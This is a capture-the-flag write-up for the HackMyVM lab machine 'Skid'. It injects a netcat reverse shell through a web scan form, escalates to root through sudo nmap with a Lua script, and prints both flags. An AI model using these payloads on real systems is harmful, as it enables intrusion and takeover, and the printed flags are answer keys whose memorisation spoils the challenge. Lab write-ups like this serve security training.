# Skid

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.177:22
Open 10.0.2.177:5000
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.177
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 8e:4d:46:ba:2a:04:65:08:e2:85:09:7d:e6:1a:d7:b3 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDVsCl1X0ydkeCtJWK7wm7IH87ic+lxO3G1Hn8DxxN/BK1s7oBwV3UiY3O4Mq38SLkxjdSW5MYed5TfZBuvf88eUphT/fvzaNBmOhY6VxalhCcCVE6tphiWecEwPL1l3gHg5yZTDrNA77Ne49IfKY+iMSqrj5Y6ZWo5Pxo5WjQl1SuneF3kvqwQXs1m9OqGEc+KRfn3uX/jF8cphpRC9fV1oFp/h/1qxC+XEp0y5F0AL4VsiaGnvEU+iAAuybnGt0xgfesAb6tk00SMZkZjaqFrjBL6Lk5GAj9V5j+FAZt6CMVgjOA3aFF8P7fi5Qc9tyluJVw2dCYHICszSYbllxAt8N1SRKi12laLKQGGqAoBsblsjqUuH9yZt6/Re1aaEG4F6CLOJOlt7eCLnttThfUUHWhot2rke80xBgzPmK/+j/7IDxd7t72QCXb5piFJtYW057xirpDGPIvGBYRWasy5DOXEnSk76Q54WsKwj8EbPyksAG1gfT/z+Ab7W+80roc=
|   256 52:f9:f6:8a:3a:21:05:84:20:01:4f:fd:bd:17:24:44 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFxAqN03NYt/JcpciHCPiN9ZesTIlj30gGarU0MFMr3GV7/bUFXKebn11Ey2qm0VKwd5/VSVAla5wD55w0LuZw8=
|   256 db:87:52:e5:d3:ff:2b:92:e8:f2:91:0a:85:63:33:db (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPlerFRd+K9cPC+ZBJ3oLfebqOIbvuIKZBLw1aGvFS8N
5000/tcp open  http    syn-ack Werkzeug httpd 3.0.6 (Python 3.8.10)
|_http-title: Jeremy's Hacker Panel
|_http-server-header: Werkzeug/3.0.6 Python/3.8.10
| http-methods: 
|_  Supported Methods: HEAD GET OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP (5000)

![writeup.png](/assets/pentest/hackmyvm/skid/writeup.png)

### Command Injection

![writeup-1.png](/assets/pentest/hackmyvm/skid/writeup-1.png)

```bash
└─$ curl 'http://10.0.2.177:5000/scan' --data-urlencode 'target=; busybox nc 10.0.2.149 4444 -e /bin/bash'
---
└─$ penelope -p 4444
jeremy@skid:~$ id
uid=1000(jeremy) gid=1000(jeremy) groups=1000(jeremy)
```

### User.txt

```bash
jeremy@skid:~$ cat user.txt
hmv{7609a0e2e5bf272609dd3e12727eed76}
```

## Privilege Escalation

```
jeremy@skid:~$ sudo -l
Matching Defaults entries for jeremy on skid:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jeremy may run the following commands on skid:
    (root) NOPASSWD: /usr/bin/nmap
```

- [https://gtfobins.github.io/gtfobins/nmap/#sudo](https://gtfobins.github.io/gtfobins/nmap/#sudo)

```bash
TF=$(mktemp)
echo 'os.execute("/bin/bash")' > $TF
sudo nmap --script=$TF
```

```bash
root@skid:/home/jeremy# id
uid=0(root) gid=0(root) groups=0(root)
```

### Root.txt

```
root@skid:/home/jeremy# cat /root/root.txt
Help I lost the root flag!
Can you please help me find it?
```

```bash
root@skid:~# find / -name root.txt 2>/dev/null
/var/lib/.cache2/root.txt
/root/root.txt

root@skid:~# cat /var/lib/.cache2/root.txt
hmv{1826b83f95bd2ffc5a665bcd54df7ed5}
```